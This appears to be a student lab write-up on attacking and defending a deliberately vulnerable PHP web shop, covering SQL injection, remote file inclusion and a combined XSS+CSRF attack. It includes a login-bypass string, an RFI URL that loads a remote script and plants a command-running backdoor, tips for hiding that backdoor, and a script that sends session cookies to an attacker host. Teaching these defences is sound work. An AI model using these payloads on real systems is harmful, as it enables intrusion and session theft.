## SQL injection

### Description:

Web servers are often stateless, meaning that requests do not affect each other. In order to for example store users' info, a database is needed. A common type of database query language is SQL. The most well known fork of SQL is MySQL. The database is simply a table where each row contains info which are grouped. In order to add/delete/modify the data in a table, SQL statements are used which describes what should be done to the database. These statements are, if not properly designed, vulnerable to an SQL injection. A SQL injection is when you manage to alter or get access to a web server's database by escaping from the SQL statement. 

### Our attack:

A common way to attack is when the SQL statement is using string concatenation, in php this would look like: `$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";`. If the login depends on if for example the number of rows is larger than zero, which is not uncommon, this query would be susceptible to an attack vector by passing `' OR '1'='1` as the $password variable. This is because this means that everything in the table would match and therefore the number of rows is larger than zero. 

### Defense: 

In order to secure against the above attack, we have implemented multiple security measures. With the most important being prepared SQL statements. This works by writing the statement as you would usually, but instead of using string concatenation you replace those variables with question marks. The next step is to call the bind_param() method which replaces the question marks with what you actually want. But this replace function does not replace the question marks as is, but instead as values. This means that any SQL statement which is malicious will only be treated as values. Therefore you would be secure against `' OR '1'='1` for example, because this is simply treated as one string and not a statement. 

## Remote file inclusion

### Description:

Remote file inclusion (RFI) is a critical web vulnerability that allows external files hosted on remote servers to be dynamically included and executed on the target web-app. This is possible if the user input isn’t properly sanitized and validated and can lead to e.g. code execution, sensitive information disclosure and denial of service. In PHP RFI’s can happen if paths aren’t properly passed to the `include()` function, i.e. properly sanitized. 

If, for different reasons, you want to dynamically include files based on user input you could implement something like this:  
```
$file = $_GET[‘file’];  
include($file);
```

By then passing an input like:  
http://vulnerable/login.php?file=http://attacker/evil.php
the code at attacker/evil.php would be included in the php script and executed.

### Our attack:
When on the login page of the web shop and a URL such as this one is given: http://localhost:8000/login.php?file=http://evil/evil_rfi a flawed implementation in the 'login.php' script will include the remote server’s `evil_rfi.php` script and execute its contents. This is possible because the `login.php` has  `$file = $_GET[‘file’];` and `include($file);` without proper handling. In our case the `evil_rfi.php` script will create a visible `backdoor.php` file on the vulnerable server which can then be accessed and used by a prompt like this: `http://localhost:8000/backdoor.php?cmd=ls`. This will in turn print out every file in vulnerable servers current directly. `cmd=ls` can of course be changed to other shell commands. In our implementation the `backdoor.php` is instantly placed in the public directory and is easily seen, but one could e.g. name the file less suspiciously like `config.php` or hide the file in deeply nested subdirectories or obfuscate the backdoor code with base64 encoding and so on. This in turn, together with a well hidden RFI, would make the backdoor very difficult to spot.    

### Defense:
To eliminate remote file inclusion we have chosen to simply never allow user-submitted input to be dynamically included and the needed paths have been hard-coded. There are however other measures that can be taken to mitigate this attack. By making sure that `allow_url_include` and `allow_url_fopen` are both set to Off (which they are by default) in the php.ini configuration, `include()` and `require()` won’t work for remote URLs. Other defenses could be to e.g. either sanitize the input or compare the inputted file path against a whitelist of approved paths and from there take relevant actions. 

## XSS + CSRF Attack

### Description:

Guarding against XSS attacks is even harder when it looks like a legit change from the user. This attack requires a legitimate change to inject malicious code that is then exposing user data or stealing their session.

### Attack

In our website the user's address is shown on his /profile.php page. This input is not properly sanitized and is directly inserted into html, but this does mostly not matter since you can only see this if you are currently logged in in an active session and it does not give you access to other users’ information. There is a form that allows the user to change the address.  
With CSRF this page is susceptible to a XSS attack. If a malicious party provides a page that submits a form that changes the address, they can insert whatever code they want, executing it when the user visits the site again (which happens instantly since changing the address reloads the current page.

### Implementation

The evil party has a site at localhost:9000 and has a page /evil_address_change which creates a request to eitf:8000 (the legit site) to perform an address change via a POST form. The address is changed to a script that performs a GET request to `"http://localhost:9000/?cookies="+ document.cookies` which attaches the current session cookie to the request.  
As a result if any logged in user clicks the evil-parties link, they will:

1. Open a page on the evil server  
2. Have a post request automatically sent to the legit sites address-change page  
   1. And be redirected to it as a result  
3. The malicious script is injected into the address field in the database  
4. After submitting the new address, the page reloads showing the new address, executing the malicious script  
5. The XSS script sends a silent GET request to the evil server which can now easily highjack the session. (For this, evil provides CORS Access-control-allowed-origin: * in order to avoid a CORS block)

## Defense:

1. Sanitize the Address input, escape any html characters  
2. Attach a random ID to the form when the html site is generated by the server, check that ID when the post is submitted. Can be attached to the current session server side.  
   1. Guessing that token (CSRF-like token) is not feasible on the evils’ side

